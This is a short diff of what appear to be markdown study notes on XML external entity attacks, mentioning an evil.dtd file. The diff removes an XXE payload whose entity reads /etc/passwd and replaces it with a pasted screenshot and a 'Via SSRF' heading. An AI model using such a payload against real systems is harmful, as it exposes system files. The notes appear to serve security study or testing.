@@ -94,12 +94,7 @@ evil.dtd
 
 Content-Type: application/xml
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE payload [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-<root>
-    <search>
-        &xxe;
-    </search>
-</root>
-```
+![[Pasted image 20241215161216.png]]
+
+# Via SSRF
+
